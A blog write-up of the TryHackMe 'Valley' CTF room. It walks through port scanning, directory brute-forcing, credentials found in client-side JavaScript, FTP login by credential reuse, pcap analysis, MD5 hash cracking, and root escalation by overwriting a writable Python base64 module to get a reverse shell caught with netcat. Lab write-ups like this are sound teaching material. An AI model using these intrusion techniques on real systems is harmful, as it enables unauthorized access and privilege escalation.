---
layout: post
title: Valley writeup (TryHackMe)
author: wizarddos
category: writeups
---

This challenge is from [TryHackMe](https://tryhackme.com/room/valleype)

## Writeup

### Port scan

Start ping scan on all ports
```
$ nmap -Pn $IP -p-  

Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown

```

We have 3 ports open - Let's scan them
```
$ nmap -sC -sV $IP -p37370,22,80

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
|_  256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel


```

We have `OpenSSH`, `Apache` and `vsftpd`

### Website Enumeration

On website I found `note.txt` in `/pricing`

```
J,
Please stop leaving notes randomly on the website
-RP
```

So there might be some notes - let's bust `/static` directory beacouse we can't list it from the webpage
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/static  -x php,html
[...]

/00                   (Status: 200) [Size: 127]
/11                   (Status: 200) [Size: 627909]
/3                    (Status: 200) [Size: 421858]
/13                   (Status: 200) [Size: 3673497]
/12                   (Status: 200) [Size: 2203486]
/10                   (Status: 200) [Size: 2275927]
/5                    (Status: 200) [Size: 1426557]
[...]
```
Files with names from 1-19 are photos from `/gallery` but in `/00` we have earlier mentioned note left

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts

```

So it has a hidden directory `/dev1243224123123` - After visiting it, we have some login form

If we try to log in, we see that auth mechanism is possibly written in js - We have it in `dev.js` file in
Our hidden directory

```
[...]
if (username === "siemDev" && password === "[Password]") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
```

There, we have credentials for this form and some other link to dev notes

There is another note
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port

```

If we trust what they say, they are reusing credentials - `siemDev` with it's password may be our FTP creds

### FTP 

First - log into FTP
```
$ ftp $IP -p 37370
220 (vsFTPd 3.0.3)
Name (10.10.97.110:wizarddos): siemDev
331 Please specify the password.
Password:  [Password]
230 Login successful.

ftp>
```

We are in - list directories and let's see what we have there
```
ftp> ls
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng

```

These look like captured internet packages - Let's download them and analyze by wireshark

```
ftp> get siemFTP.pcapng

local: siemFTP.pcapng remote: siemFTP.pcapng
229 Entering Extended Passive Mode (|||44679|)
150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
100% |***********************************************************************|  7272       80.64 MiB/s    00:00 ETA
226 Transfer complete.
7272 bytes received in 00:00 (69.47 KiB/s)

ftp> get siemHTTP1.pcapng

local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
229 Entering Extended Passive Mode (|||30906|)
150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
100% |***********************************************************************|  1932 KiB  375.53 KiB/s    00:00 ETA
226 Transfer complete.
1978716 bytes received in 00:05 (371.80 KiB/s)

ftp> get siemHTTP2.pcapng

local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
229 Entering Extended Passive Mode (|||21876|)
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
100% |***********************************************************************|  1926 KiB  555.25 KiB/s    00:00 ETA
226 Transfer complete.
1972448 bytes received in 00:03 (546.64 KiB/s)

ftp> exit
221 Goodbye.

$
```

Hop into wireshark and analyze them

### PCAP analysis

In TCP stream nr. 0 of `siemFTP.pcapng` we see an attacker loged into FTP using anonymous login, but we can't do it. This FTP daemon doesn't allow anon login

But in `siemHTTP2.pcapng` we have found something interesting

In TCP stream nr. 31 we have HTTP POST request to log in somewhere using `valleyDev` credentials - this may be for SSH

### SSH and user flag
```
$ ssh valleyDev@$IP
valleyDev@10.10.29.225's password: [Password]

[...]

valleyDev@valley:~: 
```
We are in! - get the user flag

```
$ ls
user.txt
$ cat user.txt
[User Flag]

```

We have it

Now let's do privesc

### Privilage escalation

In a `/home` dir we have `valleyAuthenticator` - this may help us escalate to another user and access more information

#### Escalation to another user

Let's download it and perform `strings` analysis on it

```
$ strings valleyAuthenticator
[...]

$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $

[...]
```
This is basicly UPX archive - let's unpack it

```
$ upx -d valleyAuthenticator
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2285616 <-    749128   32.78%   linux/amd64   valleyAuthenticator

Unpacked 1 file.

```
Note: UPX overrides passed file - It's better to not do it on attacked machine

Now, we can look for some passwords

```
$ strings valleyAuthenticator | grep -i pass -B 15 -A 15
[...]
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
[...]
```
We have 2 hashes - let's put them into `hash.txt` file and crack them with `hashcat`
```
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
[...]

dd2921cc76ee3abfd2beb60709056cfb:valley                   
e6722920bab2326f8217e4bf6b1b58ac:[Cracked Hash]             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt

[...]

```

And we have credentials for this file

Let's use it and log into 
```
$ ./valleyAuthenticator
Welcome to Valley Inc. Authenticator
What is your username: valley
What is your password: [Password]
Authenticated

$ su valley
Password: 
```
Now we have access to `/home/valley`

I see nothing interesting so let's find something else

We have some `cronjob` running in a background
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *   * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6   * * *    root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6   * * 7    root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6   1 * *    root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

```

We can't override `photosEncrypt.py` script but let's see what it does - we may find some privesc vector
```
$ cat  photosEncrypt.py

#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
   image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
   with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
   encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
   output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
   with open(output_path, "wb") as output_file:
         output_file.write(encoded_image_data)

```

This file uses `base64` module - if we overwrite it we can get a reverse shell for root 

This is called `library hijacking`

Let's check where is this library located
```
$ locate base64.py
/snap/core20/1611/usr/lib/python3.8/base64.py
/snap/core20/1828/usr/lib/python3.8/base64.py
/usr/lib/python3.8/base64.py

```
We found it in `/usr/lib/python3.8` - let's check if we can write it
```
$ ls -la /usr/lib/python3.8/base64.py
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13 03:26 /usr/lib/python3.8/base64.py

```
Users in groups `root` and `valleyAdmin` can write this file - Are we in on of these?
```
$ groups
valley valleyAdmin

```
We are in `valleyAdmin` - we can override it 

Delete whole content and write reverse shell into it - I used one from [highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell)

Then set up your netcat listener
```
$ nc -lvnp [PORT}

```

And almost immediately after starting listener we have root shell - get the root flag

```
$ cat root.txt
[Root Flag]

```

That's it  - Machine Pwned

## Conclusion

Kinda fresh (When I was writing this it was 8 days old) and interesting machine

I had some moments, when I didn't know what to do but finally I managed to solve everything

See you in next writeup

